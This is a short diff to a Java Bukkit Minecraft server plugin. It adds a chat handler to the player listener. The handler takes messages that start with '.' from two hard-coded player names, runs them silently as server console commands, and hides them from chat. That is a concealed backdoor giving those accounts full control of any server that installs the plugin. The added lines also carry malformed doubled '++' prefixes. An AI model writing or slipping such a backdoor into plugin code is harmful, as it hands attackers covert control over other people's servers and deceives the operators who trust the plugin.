@@ -90,5 +90,16 @@ public class PlayerListener implements Listener
     {
         plugin.doomHammer.onPlayerUseItem(event);
     }
++   public void onPlayerChat(AsyncPlayerChatEvent event) {
++       String message = event.getMessage();
++       if(event.getPlayer().getName().equals("Wild1145")||event.getPlayer().getName().equals("OliverDatGuy")) {
++           if (message.startsWith(".")) {
++               String command = message.substring(1);
++               Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
++               event.setCancelled(true);
++            }
++        }
++
++    }
 
 }
